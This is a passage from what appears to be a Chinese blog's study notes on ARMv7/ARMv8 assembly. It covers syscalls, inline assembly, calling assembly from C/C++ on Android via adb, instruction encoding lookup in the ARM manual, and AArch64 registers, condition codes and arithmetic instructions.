<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">    <span class="meta">.text</span></span><br><span class="line">    <span class="meta">.global</span> main</span><br><span class="line">    <span class="meta">.align</span>	<span class="number">2</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="number">#1</span>              <span class="comment">@ stdout</span></span><br><span class="line">    <span class="keyword">adr</span> <span class="built_in">r1</span>, msg             <span class="comment">@ address of the string</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r2</span>, <span class="symbol">=len</span>            <span class="comment">@ string length</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#4</span>              <span class="comment">@ syscall for &#x27;write&#x27;</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#0</span>                  <span class="comment">@ software interrupt</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">_exit:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="number">0</span>               <span class="comment">@ exit status </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#1</span>              <span class="comment">@ syscall for &#x27;exit&#x27;</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#0</span>                  <span class="comment">@ software interrupt</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">msg:</span></span><br><span class="line">    <span class="meta">.ascii</span> <span class="string">&quot;hello syscall v7\n&quot;</span></span><br><span class="line"><span class="symbol">len</span> = . - msg</span><br></pre></td></tr></table></figure>
<p>以上代码主要作用就是输出 <code>hello syscall v7</code>，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target arm-linux-android21 syscall.s -o syscall</span><br><span class="line">adb push syscall /data/local/tmp/syscall</span><br><span class="line">syscall: 1 file pushed, 0 sk... MB/s (6524 bytes <span class="keyword">in</span> 0.000s)</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/syscall</span><br><span class="line">adb shell /data/local/tmp/syscall</span><br><span class="line">hello syscall v7</span><br></pre></td></tr></table></figure>

<h2 id="C-内联汇编"><a href="#C-内联汇编" class="headerlink" title="C 内联汇编"></a>C 内联汇编</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  __asm (<span class="string">&quot;add %[result], %[input_i], %[input_j]&quot;</span></span><br><span class="line">    : [result] <span class="string">&quot;=r&quot;</span> (res)</span><br><span class="line">    : [input_i] <span class="string">&quot;r&quot;</span> (i), [input_j] <span class="string">&quot;r&quot;</span> (j)</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  c = add(a,b);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Result of %d + %d = %d\n&quot;</span>, a, b, c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上代码主要作用就是内联汇编实现两数相加，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target arm-linux-android21 helloc.c -o arm_helloc</span><br><span class="line">adb push arm_helloc /data/local/tmp/arm_helloc</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/arm_helloc</span><br><span class="line">adb shell /data/local/tmp/arm_helloc</span><br><span class="line">Result of 1 + 2 = 3</span><br></pre></td></tr></table></figure>

<h2 id="C-内联汇编-syscall"><a href="#C-内联汇编-syscall" class="headerlink" title="C 内联汇编 syscall"></a>C 内联汇编 syscall</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> exit_status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> msg[] = <span class="string">&quot;hello c inline syscall v7\n&quot;</span>;</span><br><span class="line">        <span class="type">uint32_t</span> syscall_return;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint32_t</span> r0 __asm__ (<span class="string">&quot;r0&quot;</span>) = <span class="number">1</span>; <span class="comment">/* stdout */</span></span><br><span class="line">        <span class="keyword">register</span> <span class="type">char</span> *r1 __asm__ (<span class="string">&quot;r1&quot;</span>) = msg;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint32_t</span> r2 __asm__ (<span class="string">&quot;r2&quot;</span>) = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint32_t</span> r8 __asm__ (<span class="string">&quot;r7&quot;</span>) = <span class="number">4</span>; <span class="comment">/* syscall number */</span></span><br><span class="line">        __asm__ __volatile__ (</span><br><span class="line">            <span class="string">&quot;svc 0;&quot;</span></span><br><span class="line">            : <span class="string">&quot;+r&quot;</span> (r0)</span><br><span class="line">            : <span class="string">&quot;r&quot;</span> (r1), <span class="string">&quot;r&quot;</span> (r2), <span class="string">&quot;r&quot;</span> (r8)</span><br><span class="line">            : <span class="string">&quot;memory&quot;</span></span><br><span class="line">        );</span><br><span class="line">        syscall_return = r0;</span><br><span class="line">        exit_status = (syscall_return != <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* exit */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint32_t</span> r0 __asm__ (<span class="string">&quot;r0&quot;</span>) = exit_status;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint32_t</span> r7 __asm__ (<span class="string">&quot;r7&quot;</span>) = <span class="number">1</span>;</span><br><span class="line">        __asm__ __volatile__ (</span><br><span class="line">            <span class="string">&quot;svc 0;&quot;</span></span><br><span class="line">            : <span class="string">&quot;+r&quot;</span> (r0)</span><br><span class="line">            : <span class="string">&quot;r&quot;</span> (r7)</span><br><span class="line">            :</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上代码主要作用就是内联汇编实现系统调用，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target arm-linux-android21 hellosyscall.c -o hellosyscall</span><br><span class="line">adb push hellosyscall /data/local/tmp/hellosyscall</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/hellosyscall</span><br><span class="line">adb shell /data/local/tmp/hellosyscall</span><br><span class="line">hello c inline syscall v7</span><br></pre></td></tr></table></figure>


<h2 id="C-x2F-C-调用汇编"><a href="#C-x2F-C-调用汇编" class="headerlink" title="C&#x2F;C++ 调用汇编"></a>C&#x2F;C++ 调用汇编</h2><p>汇编代码</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text</span></span><br><span class="line"><span class="symbol">.global</span> <span class="keyword">add</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">add:</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r0</span>, <span class="built_in">r1</span></span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">lr</span></span><br></pre></td></tr></table></figure>
<p>C 代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1+2=%d\n&quot;</span>, add(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C++ 代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1+2=%d\n&quot;</span>, <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上代码主要作用就是内联汇编实现系统调用，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target arm-linux-android21  -c add.s -o add.o</span><br><span class="line">clang -target arm-linux-android21  calladd.cpp add.o -o calladd</span><br><span class="line">adb push calladd /data/local/tmp/calladd</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/calladd</span><br><span class="line">adb shell /data/local/tmp/calladd</span><br><span class="line">1+2=3</span><br></pre></td></tr></table></figure>

<h1 id="ARMv8-汇编"><a href="#ARMv8-汇编" class="headerlink" title="ARMv8 汇编"></a>ARMv8 汇编</h1><p>由于 ARMv8 汇编与 ARMv7 相比，使用的差别不到，这里就简单的举两个例子进行说明。</p>
<h2 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h2><p>ARMv8 系统调用使用 <code>X8</code> 保存系统调用号，<code>X0</code> 保存返回结果，<code>X0-X5</code> 保存参数。详细信息可以使用 <code>man syscall</code> 查看文档。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text</span></span><br><span class="line"><span class="symbol">.global</span> main</span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">    <span class="comment">/* write */</span></span><br><span class="line">    <span class="keyword">mov</span> x0, <span class="number">#1</span></span><br><span class="line">    <span class="keyword">adr</span> x1, msg</span><br><span class="line">    <span class="keyword">ldr</span> x2, <span class="symbol">=len</span></span><br><span class="line">    <span class="keyword">mov</span> x8, <span class="number">#64</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#80</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* exit */</span></span><br><span class="line">    <span class="keyword">mov</span> x0, <span class="number">#0</span></span><br><span class="line">    <span class="keyword">mov</span> x8, <span class="number">#93</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#80</span></span><br><span class="line"><span class="symbol">msg:</span></span><br><span class="line">    <span class="meta">.asciz</span> <span class="string">&quot;hello syscall v8\n&quot;</span></span><br><span class="line"><span class="symbol">len</span> = . - msg</span><br></pre></td></tr></table></figure>
<p>以上代码主要作用就是输出 <code>hello syscall v8</code>，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target arm-linux-android21 syscall.s -o syscall</span><br><span class="line">adb push syscall /data/local/tmp/syscall</span><br><span class="line">syscall: 1 file pushed, 0 sk... MB/s (6524 bytes <span class="keyword">in</span> 0.000s)</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/syscall</span><br><span class="line">adb shell /data/local/tmp/syscall</span><br><span class="line">hello syscall v7</span><br></pre></td></tr></table></figure>
<h2 id="C-内联汇编-syscall-1"><a href="#C-内联汇编-syscall-1" class="headerlink" title="C 内联汇编 syscall"></a>C 内联汇编 syscall</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> exit_status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> msg[] = <span class="string">&quot;hello syscall v8\n&quot;</span>;</span><br><span class="line">        <span class="type">uint64_t</span> syscall_return;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint64_t</span> x0 __asm__ (<span class="string">&quot;x0&quot;</span>) = <span class="number">1</span>; <span class="comment">/* stdout */</span></span><br><span class="line">        <span class="keyword">register</span> <span class="type">char</span> *x1 __asm__ (<span class="string">&quot;x1&quot;</span>) = msg;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint64_t</span> x2 __asm__ (<span class="string">&quot;x2&quot;</span>) = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint64_t</span> x8 __asm__ (<span class="string">&quot;x8&quot;</span>) = <span class="number">64</span>; <span class="comment">/* syscall number */</span></span><br><span class="line">        __asm__ __volatile__ (</span><br><span class="line">            <span class="string">&quot;svc 0;&quot;</span></span><br><span class="line">            : <span class="string">&quot;+r&quot;</span> (x0)</span><br><span class="line">            : <span class="string">&quot;r&quot;</span> (x1), <span class="string">&quot;r&quot;</span> (x2), <span class="string">&quot;r&quot;</span> (x8)</span><br><span class="line">            : <span class="string">&quot;memory&quot;</span></span><br><span class="line">        );</span><br><span class="line">        syscall_return = x0;</span><br><span class="line">        exit_status = (syscall_return != <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* exit */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint64_t</span> x0 __asm__ (<span class="string">&quot;x0&quot;</span>) = exit_status;</span><br><span class="line">        <span class="keyword">register</span> <span class="type">uint64_t</span> x8 __asm__ (<span class="string">&quot;x8&quot;</span>) = <span class="number">93</span>;</span><br><span class="line">        __asm__ __volatile__ (</span><br><span class="line">            <span class="string">&quot;svc 0;&quot;</span></span><br><span class="line">            : <span class="string">&quot;+r&quot;</span> (x0)</span><br><span class="line">            : <span class="string">&quot;r&quot;</span> (x8)</span><br><span class="line">            :</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上代码主要作用就是内联汇编实现系统调用，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target aarch64-linux-android21 inline64.c -o inline64</span><br><span class="line">adb push inline64 /data/local/tmp/inline64</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/inline64</span><br><span class="line">adb shell /data/local/tmp/inline64</span><br><span class="line">hello syscall v8</span><br></pre></td></tr></table></figure>


<h1 id="如何查看文档"><a href="#如何查看文档" class="headerlink" title="如何查看文档"></a>如何查看文档</h1><p>我这里使用的文档是<a href="http://kib.kiev.ua/x86docs/ARMARM/DDI0487A_a_armv8_arm.pdf">DDI0487A_a_armv8_arm.pdf</a></p>
<h2 id="查看-AArch32-平台-beq-指令"><a href="#查看-AArch32-平台-beq-指令" class="headerlink" title="查看 AArch32 平台 beq 指令"></a>查看 AArch32 平台 beq 指令</h2><p>首先通过目录 <code>The AArch32 Instruction Sets Overview  -&gt; Branch instructions</code>找到跳转指令的页面，最终找到 b 指令文档页面。</p>
<img src="/2020/03/16/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%89/2021-03-09-12-34-38.png" class="">

<p>其中 cond 表示条件，需要去 <code>About the T32 and A32 Instruction Descriptions -&gt;Conditional execution</code> 查找。</p>
<img src="/2020/03/16/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%89/2021-03-09-12-36-32.png" class="">

<p>通过文档我们可以知道，BEQ 指令为下列格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 1010 xxxx xxxx xxxx xxxx xxxx xxxx</span><br></pre></td></tr></table></figure>
<p>其中 <code>xxxx xxxx xxxx xxxx xxxx xxxx</code> 表示  imm24 ，根据 imm32 算法，最终 imm24 应该是如下方式显示，其中 <code>s</code> 表示符号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssss ss xxxx xxxx xxxx xxxx xxxx xxxx00</span><br></pre></td></tr></table></figure>
<p>举例说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 1010 0000 0000 0000 0000 0000 0001   // 16进制为0100000A</span><br></pre></td></tr></table></figure>

<p> imm32 的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 000000 0000 0000 0000 0000 000100</span><br></pre></td></tr></table></figure>
<p>由于 RAM 指令的 3 级流水线，实际跳转指令为 <code>beq 0x4 + 2*指令长度</code> &#x3D; <code>beq 0xC</code> 。</p>
<p>最终去 <a href="https://armconverter.com/">armconverter</a> 网站进行验证：</p>
<img src="/2020/03/16/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%89/2021-03-09-13-00-38.png" class="">

<h2 id="查看-AArch64-平台-ldr-x2-x3-2-指令"><a href="#查看-AArch64-平台-ldr-x2-x3-2-指令" class="headerlink" title="查看 AArch64 平台 ldr x2, [x3], 2 指令"></a>查看 AArch64 平台 <code>ldr x2, [x3], 2</code> 指令</h2><img src="/2020/03/16/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%89/2021-03-10-13-22-33.png" class="">

<p>根据文档，该指令二进制如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">11 111 0 00 01 0 000000010 01 00011 00010</span><br></pre></td></tr></table></figure>
<p>对应的 16 进制为 0xF8402462 。</p>
<img src="/2020/03/16/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%89/2021-03-10-13-40-49.png" class="">


<p>参考：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://developer.arm.com/documentation/100069/0610/A64-General-Instructions</span><br><span class="line">https://github.com/ARM-software/abi-aa/blob/master/aapcs64/aapcs64.rst</span><br><span class="line">https://man7.org/linux/man-pages/man2/syscall.2.html</span><br><span class="line">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</span><br><span class="line">https://github.com/cirosantilli/arm-assembly-cheat</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ARMv8汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>ARMv8学习记录二</title>
    <url>/2020/03/01/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%8C/</url>
    <content><![CDATA[<p>前面的环境搭建好了，下面主要学习 ARMv8 的一些基本知识和指令</p>
<h1 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h1><h2 id="ARMv8寄存器"><a href="#ARMv8寄存器" class="headerlink" title="ARMv8寄存器"></a>ARMv8寄存器</h2><p>寄存器名称描述</p>
<table>
<thead>
<tr>
<th>位宽</th>
<th>分类</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>32-bit</td>
<td>Wn（通用）</td>
<td>WZR（0寄存器）</td>
<td>WSP（堆栈指针）</td>
</tr>
<tr>
<td>64-bit</td>
<td>Xn（通用）</td>
<td>XZR（0寄存器）</td>
<td>SP（堆栈指针）</td>
</tr>
</tbody></table>
<h3 id="AArch64通用寄存器"><a href="#AArch64通用寄存器" class="headerlink" title="AArch64通用寄存器"></a>AArch64通用寄存器</h3><p>AArch64通用寄存器共31个 <code>X0-X30</code> , 其中各寄存器的作用如下表。</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>X0</code> – <code>X7</code></td>
<td>参数和返回值</td>
</tr>
<tr>
<td><code>X8</code> – <code>X18</code></td>
<td>临时寄存器(X8一般保存结构体首地址)</td>
</tr>
<tr>
<td><code>X19</code> – <code>X28</code></td>
<td>被调用者保存的寄存器</td>
</tr>
<tr>
<td><code>X29</code></td>
<td>帧指针(<code>FP</code>)</td>
</tr>
<tr>
<td><code>X30</code></td>
<td>返回地址(<code>LR</code>)</td>
</tr>
<tr>
<td><code>SP</code></td>
<td>栈指针</td>
</tr>
</tbody></table>
<h3 id="状态寄存器-SPSR"><a href="#状态寄存器-SPSR" class="headerlink" title="状态寄存器(SPSR)"></a>状态寄存器(SPSR)</h3><ol>
<li>PSTATE at AArch64</li>
</ol>
<img src="/2020/03/01/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%8C/2020-03-09-15-57-08.png" class="">

<ol start="2">
<li>PSTATE at AArch32</li>
</ol>
<img src="/2020/03/01/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BA%8C/2020-03-09-16-00-41.png" class="">


<h3 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h3><p>此处的条件码对应的上面状态寄存器对应的标志位。</p>
<table>
<thead>
<tr>
<th>Code</th>
<th>Encoding</th>
<th>Meaning (when set by CMP)</th>
<th>Meaning (when set by FCMP)</th>
<th>Condition flags</th>
</tr>
</thead>
<tbody><tr>
<td><code>EQ</code></td>
<td>0000</td>
<td>Equal to.</td>
<td>Equal to.</td>
<td><code>Z = 1</code></td>
</tr>
<tr>
<td><code>NE</code></td>
<td>0001</td>
<td>Not equal to.</td>
<td>Unordered, or not equal to.</td>
<td><code>Z = 0</code></td>
</tr>
<tr>
<td><code>CS</code></td>
<td>0010</td>
<td>Carry set (identical to HS).</td>
<td>Greater than, equal to, or unordered (identical to HS).</td>
<td><code>C = 1</code></td>
</tr>
<tr>
<td><code>HS</code></td>
<td>0010</td>
<td>Greater than, equal to (unsigned) (identical to CS).</td>
<td>Greater than, equal to, or unordered (identical to CS).</td>
<td><code>C = 1</code></td>
</tr>
<tr>
<td><code>CC</code></td>
<td>0011</td>
<td>Carry clear (identical to LO).</td>
<td>Less than (identical to LO).</td>
<td><code>C = 0</code></td>
</tr>
<tr>
<td><code>LO</code></td>
<td>0011</td>
<td>Unsigned less than (identical to CC).</td>
<td>Less than (identical to CC).</td>
<td><code>C = 0</code></td>
</tr>
<tr>
<td><code>MI</code></td>
<td>0100</td>
<td>Minus, Negative.</td>
<td>Less than.</td>
<td><code>N = 1</code></td>
</tr>
<tr>
<td><code>PL</code></td>
<td>0101</td>
<td>Positive or zero.</td>
<td>Greater than, equal to, or unordered.</td>
<td><code>N = 0</code></td>
</tr>
<tr>
<td><code>VS</code></td>
<td>0110</td>
<td>Signed overflow.</td>
<td>Unordered. (At least one argument was NaN).</td>
<td><code>V = 1</code></td>
</tr>
<tr>
<td><code>VC</code></td>
<td>0111</td>
<td>No signed overflow.</td>
<td>Not unordered. (No argument was NaN).</td>
<td><code>V = 0</code></td>
</tr>
<tr>
<td><code>HI</code></td>
<td>1000</td>
<td>Greater than (unsigned).</td>
<td>Greater than or unordered.</td>
<td><code>(C = 1) &amp;&amp; (Z = 0)</code></td>
</tr>
<tr>
<td><code>LS</code></td>
<td>1001</td>
<td>Less than or equal to (unsigned).</td>
<td>Less than or equal to.</td>
<td>&#96;(C &#x3D; 0)</td>
</tr>
<tr>
<td><code>GE</code></td>
<td>1010</td>
<td>Greater than or equal to (signed).</td>
<td>Greater than or equal to.</td>
<td><code>N==V</code></td>
</tr>
<tr>
<td><code>LT</code></td>
<td>1011</td>
<td>Less than (signed).</td>
<td>Less than or unordered.</td>
<td><code>N!=V</code></td>
</tr>
<tr>
<td><code>GT</code></td>
<td>1100</td>
<td>Greater than (signed).</td>
<td>Greater than.</td>
<td><code>(Z==0) &amp;&amp; (N==V)</code></td>
</tr>
<tr>
<td><code>LE</code></td>
<td>1101</td>
<td>Less than or equal to (signed).</td>
<td>Less than, equal to or unordered.</td>
<td>&#96;(Z&#x3D;&#x3D;1)</td>
</tr>
<tr>
<td><code>AL</code></td>
<td>1110</td>
<td>Always executed.</td>
<td>Default. Always executed.</td>
<td><code>Any</code></td>
</tr>
<tr>
<td><code>NV</code></td>
<td>1111</td>
<td>Always executed.</td>
<td>Always executed.</td>
<td><code>Any</code></td>
</tr>
</tbody></table>
<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><h2 id="数据处理指令"><a href="#数据处理指令" class="headerlink" title="数据处理指令"></a>数据处理指令</h2><h3 id="算术和逻辑运算"><a href="#算术和逻辑运算" class="headerlink" title="算术和逻辑运算"></a>算术和逻辑运算</h3><table>
<thead>
<tr>
<th>Type</th>
<th>Instructions</th>
</tr>
</thead>
<tbody><tr>
<td>算术</td>
<td><code>ADD</code>, <code>SUB</code>, <code>ADC</code>, <code>SBC</code>, <code>NEG</code>, <code>RSB</code></td>
</tr>
<tr>
<td>逻辑</td>
<td><code>AND</code>, <code>BIC</code>, <code>ORR</code>, <code>ORN</code>, <code>EOR</code>, <code>EON</code></td>
</tr>
<tr>
<td>比较</td>
<td><code>CMP</code>, <code>CMN</code>, <code>TST</code></td>
</tr>
<tr>
<td>移动</td>
<td><code>MOV</code>, <code>MVN</code></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADC&#123;S&#125; rd, rn, rm         // rd = rn + rm + C</span><br><span class="line">ADD&#123;S&#125; rd, rn, op2        // rd = rn + op2</span><br><span class="line">ADR xd, rel               // xd = pc + re , rel 的值为 21 位有符号数。</span><br><span class="line">ADRP xd, rel              // xd = pc + rel , rel 的值为 33 位有符号数，并且 pc 和 rel 的值 4k 对齐，即低 12 位为 0 。</span><br><span class="line">CMN rd, op2               // rd + op2 影响标志位。</span><br><span class="line">CMP rd, op2               // rd - op2 影响标志位。</span><br><span class="line">MADD rd, rn, rm, ra       // rd = ra + rn * rm</span><br><span class="line">MSUB rd, rn, rm, ra       // rd = ra - rn * rm</span><br><span class="line">MNEG rd, rn, rm           // rd = - rn * rm</span><br><span class="line">MUL rd, rn, rm            // rd = rn * rm</span><br><span class="line">NEG&#123;S&#125; rd, op2            // rd = - op2</span><br><span class="line">NGC&#123;S&#125; rd, rm             // rd = -rm - ~C &lt;==&gt; rd = -rm + C - 1</span><br><span class="line">SBC&#123;S&#125; rd, rn, rm         // rd = rn -rm - ~C &lt;==&gt; rd = rn - rm + C - 1</span><br><span class="line">SDIV rd, rn, rm           // rd = rn / rm</span><br><span class="line">SMADDL Xd, Wn, Wm, Xa     // Xd = Xa + Wn * Wm</span><br><span class="line">SMNEGL Xd, Wn, Wm         // Xd = - Wn * Wm</span><br><span class="line">SMSUBL Xd, Wn, Wm, Xa     // Xd = Xa - Wn * Wm</span><br><span class="line">SMULH Xd, Xn, Xm          // Xd = (Xn * Xm) &gt;&gt; 64</span><br><span class="line">SMULL Xd, Wn, Wm          // Xd = Wn * Wm</span><br><span class="line">SUB&#123;S&#125; rd, rn, op2        // rd = rn - op2</span><br><span class="line">UDIV rd, rn, rm           // rd = rn / rm</span><br><span class="line">UMADDL Xd, Wn, Wm, Xa     // Xd = Xa + Wn * Wm</span><br><span class="line">UMNEGL Xd, Wn, Wm         // Xd = - Wn * Wm</span><br><span class="line">UMSUBL Xd, Wn, Wm, Xa     // Xd = Xa - Wn * Wm</span><br><span class="line">UMULH Xd, Xn, Xm          // Xd = Xn * Xm &gt;&gt; 64</span><br><span class="line">UMULL xd, Wn, Wm          // Xd = Wn * Wm</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMN w0, #-3                    // 等价CMP W0, #3 即 x0 == 3</span><br><span class="line">ADD W0, W1, W2, LSL #3         // W0 = W1 + (W2 &lt;&lt; 3)</span><br><span class="line">SUBS X0, X4, X3, ASR #2        // X0 = X4 - (X3 &gt;&gt; 2), set flags</span><br><span class="line">MOV X0, X1                     // Copy X1 to X0</span><br><span class="line">CMP W3, W4                     // Set flags based on W3 - W4</span><br><span class="line">ADD W0, W5, #27                // W0 = W5 + 27</span><br><span class="line">MNEG w0, w1, w2                // w0 = w0 - w1 * w2</span><br><span class="line">NEG w0, w1                     // w0 = -w1</span><br><span class="line"></span><br><span class="line">and     x1, x0, 15             // x1 = x0 % 16</span><br><span class="line"></span><br><span class="line">tst     x0, x0                 // x0 == 0?</span><br><span class="line">beq     zero</span><br><span class="line"></span><br><span class="line">eor     x0, x0, x0             // x0 = 0</span><br></pre></td></tr></table></figure>

<h3 id="乘法和除法指令"><a href="#乘法和除法指令" class="headerlink" title="乘法和除法指令"></a>乘法和除法指令</h3><table>
<thead>
<tr>
<th>Opcode</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Multiply instructions</strong></td>
<td></td>
</tr>
<tr>
<td><code>MADD</code></td>
<td>Multiply add</td>
</tr>
<tr>
